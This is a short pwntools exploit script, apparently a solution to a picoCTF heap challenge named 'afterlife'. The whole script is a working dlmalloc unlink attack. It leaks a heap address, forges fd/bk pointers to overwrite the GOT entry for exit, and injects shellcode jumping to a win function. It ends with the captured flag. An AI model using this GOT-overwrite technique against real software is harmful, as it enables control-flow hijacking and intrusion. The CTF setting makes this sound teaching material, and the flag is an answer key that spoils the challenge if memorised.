from pwn import *

elf  = ELF('./afterlife')

p = process(['./afterlife','lola'])
gdb.attach(p,'b *0x08048b12')
p.recvuntil('decimal...\n')
leak = int(p.recvline()[:-1])

fd = leak+8
bk = elf.got['exit'] - 8

payload = p32(fd) + p32(bk) + asm('mov eax,0x{:x}\njmp eax'.format(elf.symbols['win']))

p.sendlineafter('useful...\n',payload)


p.interactive()

# dl malloc unlink
# picoCTF{what5_Aft3r_187f3d9a}